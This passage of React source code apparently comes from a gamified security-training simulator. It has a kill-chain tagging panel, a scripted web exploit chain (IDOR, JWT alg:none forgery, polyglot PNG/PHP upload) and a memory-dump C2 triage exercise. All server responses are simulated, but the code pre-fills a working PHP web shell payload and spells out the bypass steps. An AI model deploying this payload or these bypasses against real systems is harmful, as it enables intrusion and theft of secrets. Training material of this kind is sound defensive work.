                className="px-2 py-1 bg-slate-900 hover:bg-cyan-950/60 border border-slate-800 hover:border-cyan-700 text-slate-300 rounded text-left truncate cursor-pointer"
              >
                1. Initial Access
              </button>
              <button
                onClick={() => handleTagEventToPhase('persistence')}
                className="px-2 py-1 bg-slate-900 hover:bg-cyan-950/60 border border-slate-800 hover:border-cyan-700 text-slate-300 rounded text-left truncate cursor-pointer"
              >
                2. Persistence
              </button>
              <button
                onClick={() => handleTagEventToPhase('credDump')}
                className="px-2 py-1 bg-slate-900 hover:bg-cyan-950/60 border border-slate-800 hover:border-cyan-700 text-slate-300 rounded text-left truncate cursor-pointer"
              >
                3. Credential Dump
              </button>
              <button
                onClick={() => handleTagEventToPhase('exfiltration')}
                className="px-2 py-1 bg-slate-900 hover:bg-cyan-950/60 border border-slate-800 hover:border-cyan-700 text-slate-300 rounded text-left truncate cursor-pointer"
              >
                4. Exfiltration
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Kill Chain Reconstruction Sequence Grid */}
      <div className="bg-[#050914] border border-slate-800 rounded-xl p-4">
        <div className="flex items-center justify-between mb-3 text-xs font-mono">
          <span className="font-bold text-white flex items-center gap-2">
            <Layers className="w-4 h-4 text-cyan-400" />
            ATTACK KILL CHAIN MATRIX
          </span>
          <span className="text-slate-400 text-[11px]">MITRE ATT&CK Enterprise Matrix Alignment</span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
          {/* Phase 1 */}
          <div className={`p-3 rounded-lg border text-xs font-mono ${
            taggedPhases.initialAccess ? 'bg-cyan-950/30 border-cyan-700' : 'bg-slate-900/40 border-slate-800'
          }`}>
            <div className="text-[10px] text-slate-400 mb-1 font-semibold">PHASE 1: INITIAL ACCESS</div>
            <div className="text-white font-bold mb-2">Web / Gateway Exploitation</div>
            <div className="text-[11px] text-cyan-300 bg-[#08101d] px-2 py-1 rounded border border-slate-800">
              {taggedPhases.initialAccess ? `Tagged: ${taggedPhases.initialAccess}` : 'Awaiting event selection...'}
            </div>
          </div>

          {/* Phase 2 */}
          <div className={`p-3 rounded-lg border text-xs font-mono ${
            taggedPhases.persistence ? 'bg-cyan-950/30 border-cyan-700' : 'bg-slate-900/40 border-slate-800'
          }`}>
            <div className="text-[10px] text-slate-400 mb-1 font-semibold">PHASE 2: PERSISTENCE</div>
            <div className="text-white font-bold mb-2">Scheduled Execution Hook</div>
            <div className="text-[11px] text-cyan-300 bg-[#08101d] px-2 py-1 rounded border border-slate-800">
              {taggedPhases.persistence ? `Tagged: ${taggedPhases.persistence}` : 'Awaiting event selection...'}
            </div>
          </div>

          {/* Phase 3 */}
          <div className={`p-3 rounded-lg border text-xs font-mono ${
            taggedPhases.credDump ? 'bg-cyan-950/30 border-cyan-700' : 'bg-slate-900/40 border-slate-800'
          }`}>
            <div className="text-[10px] text-slate-400 mb-1 font-semibold">PHASE 3: CREDENTIAL DUMP</div>
            <div className="text-white font-bold mb-2">LSASS Handle Hijack</div>
            <div className="text-[11px] text-cyan-300 bg-[#08101d] px-2 py-1 rounded border border-slate-800">
              {taggedPhases.credDump ? `Tagged: ${taggedPhases.credDump}` : 'Awaiting event selection...'}
            </div>
          </div>

          {/* Phase 4 */}
          <div className={`p-3 rounded-lg border text-xs font-mono ${
            taggedPhases.exfiltration ? 'bg-cyan-950/30 border-cyan-700' : 'bg-slate-900/40 border-slate-800'
          }`}>
            <div className="text-[10px] text-slate-400 mb-1 font-semibold">PHASE 4: EXFILTRATION</div>
            <div className="text-white font-bold mb-2">Outbound TLS Tunnel Egress</div>
            <div className="text-[11px] text-cyan-300 bg-[#08101d] px-2 py-1 rounded border border-slate-800">
              {taggedPhases.exfiltration ? `Tagged: ${taggedPhases.exfiltration}` : 'Awaiting event selection...'}
            </div>
          </div>
        </div>

        {validationError && (
          <div className="mt-3 p-2 bg-rose-950/50 border border-rose-800 text-rose-300 text-xs font-mono rounded flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 shrink-0 text-rose-400" />
            <span>{validationError}</span>
          </div>
        )}

        <div className="mt-4 flex items-center justify-between pt-3 border-t border-slate-800">
          <div className="text-xs font-mono text-slate-400">
            {isCompleted ? (
              <span className="text-emerald-400 font-bold flex items-center gap-1.5">
                <CheckCircle2 className="w-4 h-4" /> INCIDENT CONTAINED // IOCS DISPATCHED TO FIREWALLS
              </span>
            ) : (
              <span>Correlate all 4 telemetries and commit the reconstruction.</span>
            )}
          </div>

          <button
            onClick={verifyKillChain}
            disabled={isCompleted}
            className={`px-5 py-2 rounded-lg font-mono text-xs font-bold transition-all flex items-center gap-2 cursor-pointer ${
              isCompleted
                ? 'bg-emerald-900/60 text-emerald-200 border border-emerald-700 cursor-not-allowed'
                : 'bg-cyan-500 hover:bg-cyan-400 text-black shadow-[0_0_15px_rgba(6,182,212,0.4)]'
            }`}
          >
            <ShieldCheck className="w-4 h-4" />
            <span>{isCompleted ? 'KILL CHAIN VERIFIED' : 'COMMIT & VERIFY KILL CHAIN'}</span>
          </button>
        </div>
      </div>
    </div>
  );
};

/* ========================================================================= */
/* MODULE 2: MULTI-STAGE WEB EXPLOIT CHAIN (IDOR + JWT + FILE BYPASS)        */
/* ========================================================================= */

const WebExploitChainModule: React.FC<ModuleProps> = ({ soundEnabled, isCompleted, onComplete }) => {
  const [currentStage, setCurrentStage] = useState<1 | 2 | 3>(1);
  const [stageCompleted, setStageCompleted] = useState<Record<number, boolean>>({
    1: false,
    2: false,
    3: false
  });

  // Stage 1 State: IDOR
  const [idorParam, setIdorParam] = useState('ACC-8491');
  const [idorHeader, setIdorHeader] = useState('0x98b4-analyst');
  const [stage1Output, setStage1Output] = useState('');
  const [stage1Success, setStage1Success] = useState(false);

  // Stage 2 State: JWT Tampering
  const [jwtRole, setJwtRole] = useState<'viewer' | 'cluster-admin'>('viewer');
  const [jwtAlg, setJwtAlg] = useState<'HS256' | 'none'>('HS256');
  const [jwtTokenPreview, setJwtTokenPreview] = useState('');
  const [stage2Output, setStage2Output] = useState('');
  const [stage2Success, setStage2Success] = useState(false);

  // Stage 3 State: Polyglot File Upload
  const [magicBytes, setMagicBytes] = useState<'NONE' | 'PNG_MAGIC' | 'GIF_MAGIC'>('NONE');
  const [fileName, setFileName] = useState('payload.png');
  const [fileMime, setFileMime] = useState('image/png');
  const [payloadCode, setPayloadCode] = useState('<?php system($_GET["cmd"]); ?>');
  const [stage3Output, setStage3Output] = useState('');

  // Update JWT Preview dynamically
  useEffect(() => {
    const headerObj = { alg: jwtAlg, typ: 'JWT' };
    const payloadObj = {
      sub: 'ACC-0001',
      role: jwtRole,
      privilege: jwtRole === 'cluster-admin' ? 999 : 10,
      exp: 1779000000
    };
    const b64Header = btoa(JSON.stringify(headerObj)).replace(/=/g, '');
    const b64Payload = btoa(JSON.stringify(payloadObj)).replace(/=/g, '');
    const sig = jwtAlg === 'none' ? '' : 'f84bc4a0e882...';
    setJwtTokenPreview(`${b64Header}.${b64Payload}.${sig}`);
  }, [jwtRole, jwtAlg]);

  const testIdor = () => {
    playCyberSound('click', soundEnabled);
    if (idorParam.trim().toUpperCase() === 'ACC-0001' || idorParam.trim().toUpperCase() === 'ACC-001' || idorParam.trim() === '0001') {
      setStage1Success(true);
      setStageCompleted(prev => ({ ...prev, 1: true }));
      setStage1Output(`HTTP/1.1 200 OK
Content-Type: application/json
X-Security-Audit: VULNERABILITY_IDOR_CONFIRMED

{
  "account_id": "ACC-0001",
  "owner": "system.cluster.admin",
  "vault_status": "LOCKED",
  "developer_debug_endpoint": "/internal/v3/firmware-upload",
  "session_token_format": "JWT_HS256",
  "debug_jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBQ0MtMDAwMSIsInJvbGUiOiJ2aWV3ZXIifQ.f84bc..."
}`);
      playCyberSound('success', soundEnabled);
    } else {
      setStage1Success(false);
      setStage1Output(`HTTP/1.1 200 OK
Content-Type: application/json

{
  "account_id": "${idorParam}",
  "owner": "standard_employee",
  "vault_status": "RESTRICTED",
  "error": "Standard account records only. Admin vault remains hidden."
}`);
      playCyberSound('error', soundEnabled);
    }
  };

  const testJwtBypass = () => {
    playCyberSound('click', soundEnabled);
    if (jwtRole === 'cluster-admin' && jwtAlg === 'none') {
      setStage2Success(true);
      setStageCompleted(prev => ({ ...prev, 2: true }));
      setStage2Output(`HTTP/1.1 200 OK
Authorization: Bearer Accepted
X-Auth-Bypass: JWT_ALG_NONE_SUCCESS

{
  "access_granted": true,
  "role": "cluster-admin",
  "privilege_level": 999,
  "service": "Internal Firmware & Script Deployment Gate",
  "upload_route": "POST /internal/v3/firmware-upload",
  "accepted_types": ["image/png", "image/gif"],
  "note": "Strict file signature verification enforced via mime_content_type()"
}`);
      playCyberSound('success', soundEnabled);
    } else if (jwtRole === 'cluster-admin' && jwtAlg === 'HS256') {
      setStage2Success(false);
      setStage2Output(`HTTP/1.1 401 Unauthorized
{
  "error": "SignatureVerificationFailed",
  "message": "Token payload altered without valid server secret key. Try algorithmic downgrade."
}`);
      playCyberSound('error', soundEnabled);
    } else {
      setStage2Success(false);
      setStage2Output(`HTTP/1.1 403 Forbidden
{
  "error": "InsufficientPermissions",
  "message": "Role 'viewer' is not authorized to access internal deployment gate."
}`);
      playCyberSound('error', soundEnabled);
    }
  };

  const testFileUpload = () => {
    playCyberSound('click', soundEnabled);
    const hasMagicBytes = magicBytes === 'PNG_MAGIC';
    const isDoubleExt = fileName.toLowerCase().endsWith('.php.png') || fileName.toLowerCase().endsWith('.phtml') || fileName.toLowerCase().includes('.php');
    const hasWebShell = payloadCode.includes('<?php') && payloadCode.includes('system(');

    if (hasMagicBytes && isDoubleExt && hasWebShell && fileMime === 'image/png') {
      setStageCompleted(prev => ({ ...prev, 3: true }));
      setStage3Output(`[+] FILE ACCEPTED BY MIME-CHECK: Magic Header 89 50 4E 47 detected.
[+] Saved to webroot: /var/www/uploads/${fileName}
[+] Executing Test Command: GET /uploads/${fileName}?cmd=cat+/vault/secrets/master_key.env

HTTP/1.1 200 OK
MASTER_VAULT_KEY=CYBERNETICS{WEB_CHAIN_IDOR_JWT_POLYGLOT_PWNED}
ROOT_UID=0(root)
EXPLOIT_STATUS=ROOT_COMPROMISED`);
      playCyberSound('powerup', soundEnabled);
      onComplete();
    } else {
      let reason = '';
      if (!hasMagicBytes) reason += '[!] Rejected: File header failed binary signature check (Missing PNG magic bytes: \\x89PNG\\r\\n\\x1a\\n).\n';
      if (!isDoubleExt) reason += '[!] Rejected: Uploaded file will not be executed by web server engine (Extension must trigger PHP interpreter).\n';
      if (!hasWebShell) reason += '[!] Rejected: Missing executable PHP command evaluation payload.\n';
      setStage3Output(`HTTP/1.1 400 Bad Request\n${reason}`);
      playCyberSound('error', soundEnabled);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between pb-4 border-b border-slate-800 gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono font-bold text-amber-400 bg-amber-950/60 border border-amber-800/80 px-2 py-0.5 rounded">
              TICKET: SEC-882-PENTEST
            </span>
            <span className="text-xs font-mono text-slate-400">APPLICATION: OMNIVAULT FINANCIAL CORE</span>
          </div>
          <h3 className="text-xl font-bold font-mono text-white">Multi-Stage Web Exploit Chain</h3>
          <p className="text-xs text-slate-400">
            Chain an Insecure Direct Object Reference (IDOR), an unverified JWT algorithm tampering attack, and a polyglot file upload bypass to compromise root.
          </p>
        </div>

        {/* Chain Stage Pills */}
        <div className="flex items-center gap-2">
          {[
            { num: 1 as const, title: '1. IDOR' },
            { num: 2 as const, title: '2. JWT Forgery' },
            { num: 3 as const, title: '3. Polyglot Upload' },
          ].map(s => (
            <button
              key={s.num}
              onClick={() => {
                setCurrentStage(s.num);
                playCyberSound('click', soundEnabled);
              }}
              className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold flex items-center gap-1.5 cursor-pointer ${
                currentStage === s.num
                  ? 'bg-amber-500 text-black shadow-[0_0_12px_rgba(245,158,11,0.4)]'
                  : stageCompleted[s.num]
                  ? 'bg-emerald-950 text-emerald-300 border border-emerald-800'
                  : 'bg-slate-900 text-slate-400 border border-slate-800'
              }`}
            >
              {stageCompleted[s.num] && <Check className="w-3.5 h-3.5" />}
              <span>{s.title}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Stage 1: IDOR */}
      {currentStage === 1 && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-6 space-y-4">
            <div className="p-3.5 bg-[#050914] border border-slate-800 rounded-xl">
              <h4 className="text-xs font-mono font-bold text-amber-400 mb-2 flex items-center gap-1.5">
                <Sliders className="w-4 h-4" /> STAGE 1: HORIZONTAL PRIVILEGE ESCALATION (IDOR)
              </h4>
              <p className="text-xs text-slate-300 leading-relaxed mb-4">
                The authenticated endpoint exposes financial vaults via query parameters without validating ownership against the session identity. Manipulate the account identifier to discover the SuperAdmin record.
              </p>

              <div className="space-y-3 font-mono text-xs">
                <div>
                  <label className="text-slate-400 block mb-1">Target Account ID Parameter:</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={idorParam}
                      onChange={(e) => setIdorParam(e.target.value)}
                      placeholder="e.g. ACC-0001"
                      className="flex-1 px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-amber-400"
                    />
                    <button
                      onClick={() => setIdorParam('ACC-0001')}
                      className="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-amber-300 rounded text-[11px]"
                    >
                      Fill Admin ID
                    </button>
                  </div>
                </div>

                <div>
                  <label className="text-slate-400 block mb-1">Session UUID Header:</label>
                  <input
                    type="text"
                    disabled
                    value={idorHeader}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded text-slate-500 text-[11px]"
                  />
                </div>

                <button
                  onClick={testIdor}
                  className="w-full py-2.5 bg-amber-500 hover:bg-amber-400 text-black font-bold rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(245,158,11,0.3)]"
                >
                  <Play className="w-4 h-4" />
                  <span>TRANSMIT HTTP REQUEST</span>
                </button>
              </div>
            </div>

            {stage1Success && (
              <div className="p-3 bg-emerald-950/40 border border-emerald-700 rounded-lg flex items-center justify-between text-xs font-mono">
                <span className="text-emerald-300">Stage 1 Verified: Leaked Internal Admin Debug Route & JWT Structure!</span>
                <button
                  onClick={() => {
                    setCurrentStage(2);
                    playCyberSound('click', soundEnabled);
                  }}
                  className="px-3 py-1 bg-emerald-600 hover:bg-emerald-500 text-white rounded font-bold inline-flex items-center gap-1 cursor-pointer"
                >
                  <span>Advance to Stage 2</span>
                  <ChevronRight className="w-3.5 h-3.5" />
                </button>
              </div>
            )}
          </div>

          <div className="lg:col-span-6 bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs flex flex-col">
            <div className="text-slate-400 pb-2 mb-2 border-b border-slate-800 text-[11px] flex items-center justify-between">
              <span>HTTP RAW REPLAY STREAM</span>
              <span className="text-amber-400">PORT: 443 / HTTPS</span>
            </div>
            <pre className="flex-1 bg-[#0b1220] p-3 rounded border border-slate-800/80 text-slate-300 overflow-x-auto text-[11px] whitespace-pre-wrap leading-relaxed">
              {stage1Output || `GET /api/v2/financial-records?account_id=${idorParam} HTTP/1.1
Host: omnivault.corp.internal
Authorization: Bearer ${idorHeader}
Accept: application/json

[Awaiting Transmission...]`}
            </pre>
          </div>
        </div>
      )}

      {/* Stage 2: JWT Tampering & alg:none */}
      {currentStage === 2 && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-6 space-y-4">
            <div className="p-3.5 bg-[#050914] border border-slate-800 rounded-xl">
              <h4 className="text-xs font-mono font-bold text-amber-400 mb-2 flex items-center gap-1.5">
                <Key className="w-4 h-4" /> STAGE 2: CRYPTOGRAPHIC JWT ALGORITHM BYPASS
              </h4>
              <p className="text-xs text-slate-300 leading-relaxed mb-4">
                The legacy endpoint accepts JSON Web Tokens but fails to reject the insecure `alg: "none"` specification. Modify the role claim to `cluster-admin` and switch the algorithm to bypass HMAC signature verification.
              </p>

              <div className="space-y-3 font-mono text-xs">
                <div>
                  <label className="text-slate-400 block mb-1">Claim: Role Escalation</label>
                  <select
                    value={jwtRole}
                    onChange={(e) => setJwtRole(e.target.value as any)}
                    className="w-full px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-amber-400"
                  >
                    <option value="viewer">role: "viewer" (Read-only)</option>
                    <option value="cluster-admin">role: "cluster-admin" (Full Upload Privileges)</option>
                  </select>
                </div>

                <div>
                  <label className="text-slate-400 block mb-1">Algorithm Header (alg):</label>
                  <select
                    value={jwtAlg}
                    onChange={(e) => setJwtAlg(e.target.value as any)}
                    className="w-full px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-amber-400"
                  >
                    <option value="HS256">HS256 (Enforces HMAC-SHA256 signature check)</option>
                    <option value="none">none (Algorithm Downgrade / Strips signature verification)</option>
                  </select>
                </div>

                <div>
                  <label className="text-slate-400 block mb-1">Crafted Base64URL Bearer Token:</label>
                  <div className="p-2 bg-[#0b1220] rounded border border-slate-800 text-[10px] text-cyan-300 break-all">
                    {jwtTokenPreview}
                  </div>
                </div>

                <button
                  onClick={testJwtBypass}
                  className="w-full py-2.5 bg-amber-500 hover:bg-amber-400 text-black font-bold rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(245,158,11,0.3)]"
                >
                  <Unlock className="w-4 h-4" />
                  <span>TRANSMIT FORGED JWT</span>
                </button>
              </div>
            </div>

            {stage2Success && (
              <div className="p-3 bg-emerald-950/40 border border-emerald-700 rounded-lg flex items-center justify-between text-xs font-mono">
                <span className="text-emerald-300">Stage 2 Verified: Admin privileges acquired via alg:none!</span>
                <button
                  onClick={() => {
                    setCurrentStage(3);
                    playCyberSound('click', soundEnabled);
                  }}
                  className="px-3 py-1 bg-emerald-600 hover:bg-emerald-500 text-white rounded font-bold inline-flex items-center gap-1 cursor-pointer"
                >
                  <span>Advance to Stage 3</span>
                  <ChevronRight className="w-3.5 h-3.5" />
                </button>
              </div>
            )}
          </div>

          <div className="lg:col-span-6 bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs flex flex-col">
            <div className="text-slate-400 pb-2 mb-2 border-b border-slate-800 text-[11px] flex items-center justify-between">
              <span>ADMIN MICROSERVICE AUTH REPONSE</span>
              <span className="text-cyan-400">GATEWAY: /internal/v3</span>
            </div>
            <pre className="flex-1 bg-[#0b1220] p-3 rounded border border-slate-800/80 text-slate-300 overflow-x-auto text-[11px] whitespace-pre-wrap leading-relaxed">
              {stage2Output || `POST /internal/v3/firmware-upload HTTP/1.1
Host: omnivault.corp.internal
Authorization: Bearer ${jwtTokenPreview}

[Awaiting JWT verification request...]`}
            </pre>
          </div>
        </div>
      )}

      {/* Stage 3: Polyglot File Upload */}
      {currentStage === 3 && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-6 space-y-4">
            <div className="p-3.5 bg-[#050914] border border-slate-800 rounded-xl">
              <h4 className="text-xs font-mono font-bold text-amber-400 mb-2 flex items-center gap-1.5">
                <Zap className="w-4 h-4" /> STAGE 3: POLYGLOT FILE UPLOAD & MAGIC BYTE BYPASS
              </h4>
              <p className="text-xs text-slate-300 leading-relaxed mb-4">
                The firmware uploader inspects file headers with `finfo()` and checks Content-Type. Craft a polyglot image embedding valid PNG magic bytes (`\x89PNG\r\n\x1a\n`) with executable PHP web shell payload.
              </p>

              <div className="space-y-3 font-mono text-xs">
                <div>
                  <label className="text-slate-400 block mb-1">Magic Byte Header Injection:</label>
                  <select
                    value={magicBytes}
                    onChange={(e) => setMagicBytes(e.target.value as any)}
                    className="w-full px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-amber-400"
                  >
                    <option value="NONE">None (Raw PHP script text)</option>
                    <option value="GIF_MAGIC">GIF89a (GIF header)</option>
                    <option value="PNG_MAGIC">\x89PNG\r\n\x1a\n (PNG magic signature header)</option>
                  </select>
                </div>

                <div>
                  <label className="text-slate-400 block mb-1">Target Filename & Extension:</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={fileName}
                      onChange={(e) => setFileName(e.target.value)}
                      placeholder="e.g. exploit.php.png or shell.phtml"
                      className="flex-1 px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-amber-400"
                    />
                    <button
                      onClick={() => setFileName('backdoor.php.png')}
                      className="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-amber-300 rounded text-[11px]"
                    >
                      Use .php.png
                    </button>
                  </div>
                </div>

                <div>
                  <label className="text-slate-400 block mb-1">HTTP Content-Type Header:</label>
                  <input
                    type="text"
                    value={fileMime}
                    onChange={(e) => setFileMime(e.target.value)}
                    className="w-full px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-amber-400"
                  />
                </div>

                <div>
                  <label className="text-slate-400 block mb-1">Embedded PHP Payload:</label>
                  <input
                    type="text"
                    value={payloadCode}
                    onChange={(e) => setPayloadCode(e.target.value)}
                    className="w-full px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-amber-400 text-[11px]"
                  />
                </div>

                <button
                  onClick={testFileUpload}
                  className="w-full py-2.5 bg-amber-500 hover:bg-amber-400 text-black font-bold rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(245,158,11,0.3)]"
                >
                  <Flame className="w-4 h-4" />
                  <span>DISPATCH POLYGLOT PAYLOAD</span>
                </button>
              </div>
            </div>
          </div>

          <div className="lg:col-span-6 bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs flex flex-col">
            <div className="text-slate-400 pb-2 mb-2 border-b border-slate-800 text-[11px] flex items-center justify-between">
              <span>UPLOAD EXECUTION CONSOLE</span>
              <span className="text-emerald-400">RCE VERIFICATION</span>
            </div>
            <pre className="flex-1 bg-[#0b1220] p-3 rounded border border-slate-800/80 text-slate-300 overflow-x-auto text-[11px] whitespace-pre-wrap leading-relaxed">
              {stage3Output || `POST /internal/v3/firmware-upload HTTP/1.1
Content-Type: multipart/form-data
Authorization: Bearer [alg:none Validated]

Waiting for polyglot transmission to trigger remote command execution...`}
            </pre>
          </div>
        </div>
      )}
    </div>
  );
};

/* ========================================================================= */
/* MODULE 3: MEMORY DUMP & MALWARE TRIAGE (VOLATILITY & PCAP C2)             */
/* ========================================================================= */

const MemoryMalwareModule: React.FC<ModuleProps> = ({ soundEnabled, isCompleted, onComplete }) => {
  const [activeTab, setActiveTab] = useState<'volatility' | 'hex-strings' | 'pcap'>('volatility');
  const [xorKey, setXorKey] = useState<'0x00' | '0x33' | '0x5A' | '0x7B'>('0x00');
  const [isDecrypted, setIsDecrypted] = useState(false);
  const [firewallBlockInput, setFirewallBlockInput] = useState('');
  const [blockConfirmed, setBlockConfirmed] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // Encrypted C2 strings: XOR'd with 0x5A
  // Plaintext: "C2=telemetry-sync-service.top;PORT=8443;AES_KEY=V4ult#K3y99!"
  const handleXorChange = (key: '0x00' | '0x33' | '0x5A' | '0x7B') => {
    setXorKey(key);
    playCyberSound('keystroke', soundEnabled);
    if (key === '0x5A') {
      setIsDecrypted(true);
      playCyberSound('success', soundEnabled);
    } else {
      setIsDecrypted(false);
    }
  };

  const handleApplyBlock = () => {
    playCyberSound('click', soundEnabled);
    const clean = firewallBlockInput.trim().toLowerCase();
    if (clean.includes('telemetry-sync-service.top') || clean === '185.220.101.5') {
      setBlockConfirmed(true);
      setErrorMsg('');
      playCyberSound('powerup', soundEnabled);
      onComplete();
    } else {
      setErrorMsg('Incorrect C2 domain or IP. Inspect the decrypted memory strings or PCAP handshake.');
      playCyberSound('error', soundEnabled);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between pb-4 border-b border-slate-800 gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono font-bold text-purple-400 bg-purple-950/60 border border-purple-800/80 px-2 py-0.5 rounded">
              ARTIFACT: WS-EXEC-FL04.DMP
            </span>
            <span className="text-xs font-mono text-slate-400">MALWARE: RUNDLL32 INJECTION (PROCESS HOLLOWING)</span>
          </div>
          <h3 className="text-xl font-bold font-mono text-white">Memory Dump & Malware C2 Triage</h3>
          <p className="text-xs text-slate-400">
            Analyze memory artifacts with Volatility, extract obfuscated strings using single-byte XOR heuristics, and dissect PCAP packets to neutralize active Command & Control (C2).
          </p>
        </div>

        {/* View Switcher Tabs */}
        <div className="flex items-center gap-1.5 bg-[#050914] p-1 rounded-lg border border-slate-800 font-mono text-xs">
          <button
            onClick={() => setActiveTab('volatility')}
            className={`px-3 py-1.5 rounded-md cursor-pointer ${
              activeTab === 'volatility' ? 'bg-purple-600 text-white font-bold' : 'text-slate-400 hover:text-white'
            }`}
          >
            1. Volatility Tree
          </button>
          <button
            onClick={() => setActiveTab('hex-strings')}
            className={`px-3 py-1.5 rounded-md cursor-pointer ${
              activeTab === 'hex-strings' ? 'bg-purple-600 text-white font-bold' : 'text-slate-400 hover:text-white'
            }`}
          >
            2. XOR Memory Strings
          </button>
          <button
            onClick={() => setActiveTab('pcap')}
            className={`px-3 py-1.5 rounded-md cursor-pointer ${
              activeTab === 'pcap' ? 'bg-purple-600 text-white font-bold' : 'text-slate-400 hover:text-white'
            }`}
          >
            3. PCAP & Containment
          </button>
        </div>
      </div>

      {/* Tab 1: Volatility Process Tree & Malfind */}
      {activeTab === 'volatility' && (
        <div className="space-y-4">
          <div className="bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs">
            <div className="flex items-center justify-between pb-2 mb-3 border-b border-slate-800 text-[11px] text-slate-400">
              <span className="flex items-center gap-1.5 text-purple-400 font-bold">
                <Terminal className="w-4 h-4" /> volatility3 -f WS-EXEC-FL04.dmp windows.malfind
              </span>
              <span className="text-slate-500">MEMORY PROFILE: Win10x64_19041</span>
            </div>

            <pre className="bg-[#0b1220] p-3 rounded border border-slate-800 text-slate-300 text-[11px] leading-relaxed overflow-x-auto whitespace-pre">
{`PID    PPID   Process         Memory Protection     Start Address          End Address            Tag / Artifact
--------------------------------------------------------------------------------------------------------------------
1048   640    services.exe    PAGE_EXECUTE_READ     0x00007ff810000000     0x00007ff810052000     CLEAN
3412   1210   explorer.exe    PAGE_EXECUTE_READ     0x00007ff7c0000000     0x00007ff7c0410000     CLEAN
5180   3412   rundll32.exe    PAGE_EXECUTE_READWRITE 0x0000021a4b000000    0x0000021a4b08f000     [!] UNBACKED_VAD / MZ_HEADER
9104   5180   cmd.exe         PAGE_EXECUTE_READ     0x00007ff6a0000000     0x00007ff6a0040000     SPAWNED_BY_INJECTION

[!] ANOMALY FOUND ON PID 5180 (rundll32.exe):
- Address range 0x0000021a4b000000 has PAGE_EXECUTE_READWRITE permissions without a corresponding DLL file on disk.
- Hex dump of 0x0000021a4b000000 reveals embedded PE headers and XOR-obfuscated configuration strings.`}
            </pre>
          </div>

          <div className="flex items-center justify-between p-3 bg-purple-950/30 border border-purple-800/60 rounded-xl text-xs font-mono">
            <span className="text-purple-300">
              Process ID 5180 (rundll32.exe) is confirmed hollowed. Advance to XOR strings analysis to carve the C2 config.
            </span>
            <button
              onClick={() => {
                setActiveTab('hex-strings');
                playCyberSound('click', soundEnabled);
              }}
              className="px-3 py-1.5 bg-purple-600 hover:bg-purple-500 text-white rounded font-bold inline-flex items-center gap-1 cursor-pointer"
            >
              <span>Carve Strings</span>
              <ChevronRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      )}

      {/* Tab 2: XOR Decryption & Hex Dump */}
      {activeTab === 'hex-strings' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-5 space-y-4">
            <div className="p-4 bg-[#050914] border border-slate-800 rounded-xl font-mono text-xs">
              <h4 className="font-bold text-purple-400 mb-2 flex items-center gap-1.5">
                <Hash className="w-4 h-4" /> XOR HEURISTIC BRUTE-FORCER
              </h4>
              <p className="text-slate-300 text-xs mb-4 leading-relaxed">
                Adversaries frequently apply single-byte XOR masks to avoid static YARA signatures. Select candidate keys to evaluate entropy and decode readable ASCII strings.
              </p>

              <div className="space-y-3">
                <label className="text-slate-400 block text-xs">Candidate XOR Key:</label>
                <div className="grid grid-cols-2 gap-2 text-xs">
                  {[
                    { key: '0x00' as const, label: '0x00 (Raw Hex / No XOR)' },
                    { key: '0x33' as const, label: '0x33 (Bit Shift Mask)' },
                    { key: '0x5A' as const, label: '0x5A (Entropy Valley)' },
                    { key: '0x7B' as const, label: '0x7B (High-Nibble)' },
                  ].map(k => (
                    <button
                      key={k.key}
                      onClick={() => handleXorChange(k.key)}
                      className={`p-2 rounded border text-left cursor-pointer ${
                        xorKey === k.key
                          ? 'bg-purple-600 text-white border-purple-400 font-bold'
                          : 'bg-[#0b1220] text-slate-400 border-slate-800 hover:border-slate-700'
                      }`}
                    >
                      {k.label}
                    </button>
                  ))}
                </div>
              </div>

              {isDecrypted && (
                <div className="mt-4 p-3 bg-emerald-950/40 border border-emerald-700 rounded text-xs text-emerald-300 space-y-1">
                  <div className="font-bold">✓ C2 BEACON CONFIGURATION EXTRACTED:</div>
                  <div>DOMAIN: <span className="text-white font-bold">telemetry-sync-service.top</span></div>
                  <div>EGRESS PORT: 8443 (mTLS)</div>
